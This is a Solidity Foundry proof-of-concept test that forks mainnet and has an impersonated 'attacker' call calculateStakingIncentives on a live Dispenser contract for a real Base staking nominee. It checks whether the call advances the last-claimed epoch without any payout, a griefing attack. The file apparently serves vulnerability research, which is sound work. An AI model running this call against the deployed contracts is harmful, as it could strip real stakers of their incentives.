// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Test} from "forge-std/Test.sol";

interface IDispenser {
    function calculateStakingIncentives(
        uint256 numClaimingEpochs,
        uint256 chainId,
        bytes32 stakingTarget,
        uint256 bridgingDecimals
    ) external returns (
        uint256 totalStakingIncentive,
        uint256 totalReturnAmount,
        uint256 lastClaimedEpoch,
        bytes32 nomineeHash
    );
    function mapLastClaimedStakingEpochs(bytes32) external view returns (uint256);
    function mapZeroWeightEpochRefunded(uint256) external view returns (bool);
}

interface ITokenomics {
    function epochCounter() external view returns (uint32);
}

contract PoC_StakingGriefing2 is Test {
    address constant DISPENSER = 0x5650300fCBab43A0D7D02F8Cb5d0f039402593f0;
    address constant TOKENOMICS = 0xc096362fa6f4A4B1a9ea68b1043416f3381ce300;
    
    // Real nominee: staking contract on Base (chainId 8453)
    address constant STAKING_TARGET = 0x4D804a665097855b1158CD8045A819ee9fD0e540;
    uint256 constant CHAIN_ID = 8453;

    function setUp() public {
        vm.createSelectFork("mainnet");
    }

    function test_PoC_PublicCallWithRealNominee() public {
        IDispenser dispenser = IDispenser(DISPENSER);
        ITokenomics tokenomics = ITokenomics(TOKENOMICS);

        bytes32 target = bytes32(uint256(uint160(STAKING_TARGET)));
        uint32 currentEpoch = tokenomics.epochCounter();
        
        emit log_named_uint("Current epoch", currentEpoch);

        // Compute nomineeHash the same way Dispenser does internally
        // nomineeHash = keccak256(abi.encode(Nominee(account, chainId)))
        bytes32 nomineeHash = keccak256(abi.encode(
            STAKING_TARGET,
            CHAIN_ID
        ));
        
        uint256 lastClaimed = dispenser.mapLastClaimedStakingEpochs(nomineeHash);
        emit log_named_uint("Last claimed epoch for this nominee", lastClaimed);
        emit log_named_uint("Epochs available to claim", currentEpoch > lastClaimed ? currentEpoch - lastClaimed - 1 : 0);

        // Call as random attacker
        address attacker = address(0xDEADBEEF);
        vm.prank(attacker);
        
        try dispenser.calculateStakingIncentives(
            1,           // numClaimingEpochs
            CHAIN_ID,    // chainId (Base)
            target,      // stakingTarget
            18           // bridgingDecimals
        ) returns (
            uint256 totalStaking,
            uint256 totalReturn,
            uint256 lastEpoch,
            bytes32 nominee
        ) {
            emit log("=== SUCCESS: Attacker called calculateStakingIncentives ===");
            emit log_named_uint("totalStakingIncentive", totalStaking);
            emit log_named_uint("totalReturnAmount", totalReturn);
            emit log_named_uint("lastClaimedEpoch", lastEpoch);

            // Check if state was mutated
            uint256 newLastClaimed = dispenser.mapLastClaimedStakingEpochs(nomineeHash);
            emit log_named_uint("New last claimed epoch", newLastClaimed);
            
            if (newLastClaimed > lastClaimed) {
                emit log("!!! STATE MUTATED: lastClaimedEpoch advanced by external call !!!");
                emit log("!!! This means the epoch is now 'processed' without actual distribution !!!");
            }
        } catch (bytes memory reason) {
            emit log("Reverted (expected if no claimable epochs):");
            emit log_named_uint("Reason selector", uint32(bytes4(reason)));
        }
    }
}
